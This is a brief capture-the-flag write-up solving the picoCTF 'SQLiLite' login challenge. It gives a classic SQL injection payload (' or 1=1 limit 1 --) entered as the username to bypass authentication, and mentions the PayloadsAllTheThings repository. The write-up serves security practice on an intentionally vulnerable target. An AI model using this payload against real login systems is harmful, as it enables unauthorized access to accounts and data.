# SQLiLite

Can you login to this website?

> https://play.picoctf.org/practice/challenge/304

# Tools used

- Browser
- swisskyrepo/PayloadsAllTheThings

# Solve

Basic SQL injection. Using this payload as the username and anything as the password

```
' or 1=1 limit 1 --
```

![alt text](../../../../assets/SQLiLite-1.png)

We logged in successfully

![alt text](../../../../assets/SQLiLite-2.png)